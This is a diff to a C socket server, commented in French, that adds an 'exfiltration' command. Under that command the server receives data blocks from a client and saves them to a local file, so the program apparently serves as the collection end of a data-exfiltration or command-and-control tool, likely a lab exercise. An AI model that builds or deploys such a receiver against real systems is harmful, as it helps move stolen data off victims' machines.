@@ -162,11 +162,43 @@ int main()
                 }
             }
 
-            close(client_fd);
-            printf("Client connection closed.\n");
+            if (strcmp(command, "exfiltration") == 0)
+            {
+                // Fichier où les données seront sauvegardées
+                FILE *output_file = fopen("loreemtoextract_received.txt", "wb");
+                if (!output_file)
+                {
+                    perror("Erreur lors de l'ouverture du fichier de sortie");
+                    break;
+                }
+
+                // Réception des blocs de données envoyés par le client
+                while ((bytes_read = recv(client_fd, buffer, BUFSIZ, 0)) > 0)
+                {
+                    // Écrire les données dans le fichier
+                    if (fwrite(buffer, sizeof(char), bytes_read, output_file) != bytes_read)
+                    {
+                        perror("Erreur lors de l'écriture dans le fichier");
+                        break;
+                    }
+                    printf("Bloc reçu et écrit dans le fichier.\n");
+                }
+
+                if (bytes_read == -1)
+                {
+                    perror("Erreur de réception des données");
+                }
+
+                // Fermer le fichier après réception
+                fclose(output_file);
+            }
         }
 
-        close(socket_fd);
-        return 0;
+        close(client_fd);
+        printf("Client connection closed.\n");
     }
+
+    close(socket_fd);
+    return 0;
+}
 }
